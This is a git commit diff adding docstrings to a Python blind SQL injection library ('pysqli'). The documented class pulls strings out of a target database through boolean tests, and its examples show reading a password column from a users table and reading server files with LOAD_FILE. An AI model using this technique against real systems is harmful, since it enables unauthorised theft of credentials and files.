fd2372b1ffc9e33e9d6d84263ffbf46c46825ea6
manu <dev@lacourarie.org>
2018-11-23 23:08:17 +0100

    Document blind_string_finder.

--- pysqli/blind_string_finder.py
+++ pysqli/blind_string_finder.py
@@ -6,8 +6,15 @@ from pysqli.tools import *
 
 
 class BlindStringFinder(StringFinder):
+    """
+    String finder based on the blind technique.
+    """
 
     def __init__(self, tester: BlindTester):
+        """
+        Create a BlindTester based on a BlindTester
+        :param tester: BlindTester
+        """
         self.tester = tester
 
     def search_length(self, sql, a, b):
@@ -48,6 +55,18 @@ class BlindStringFinder(StringFinder):
             return self.search_char(sql, i, pivot, b)
 
     def read_string(self, sql):
+        """
+        Read a string via the blind technique.
+        The search is multithreaded.
+        Use parentheses if possible ("(SELECT version())" in place of "SELECT version()")
+        see SqliEncoder to encode the string if quotes are not possibles.
+
+        :param sql: sql code to read.
+                    examples :  - (SELECT pass FROM users LIMIT 1 OFFSET 2)
+                                - (SELECT version())
+
+        :return:
+        """
         if self.tester.test("AND LENGTH({})>0".format(sql)):
             length = self.str_length(sql)
             with ThreadPool(40) as pool:
@@ -59,5 +78,11 @@ class BlindStringFinder(StringFinder):
             print("[-] string {} do not exist or is null".format(sql))
 
     def read_file(self, filename):
-        return self.read_string("LOAD_FILE({})".format(encode_str(filename)))
+        """
+        Read a file via the read_string technique.
+
+        :param filename: name of the file to read
+        :return:
+        """
+        return self.read_string("(LOAD_FILE({}))".format(encode_str(filename)))
 
